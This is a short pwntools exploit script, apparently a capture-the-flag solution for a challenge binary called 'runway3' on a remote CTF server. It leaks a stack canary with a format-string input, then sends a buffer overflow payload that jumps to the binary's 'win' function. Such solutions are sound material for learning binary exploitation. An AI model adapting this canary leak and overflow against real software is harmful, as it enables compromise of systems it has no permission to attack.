from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("runway3")

# p = gdb.debug(elf.path, gdbscript='continue')
#p = process()
p = remote("challs.pwnoh.io", 13403)

# Leak puts
rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]


p.sendline("%35$lx")
p.recvline().strip()
canary = int(p.recvline().strip(),16)
log.info(f'canary = {hex(canary)}')
log.info(f'canary = {p64(canary)}')
payload = flat(
    cyclic(40),
    p64(canary)*2,
    RET,
    elf.sym['win']
)

p.sendline(payload)
p.interactive()
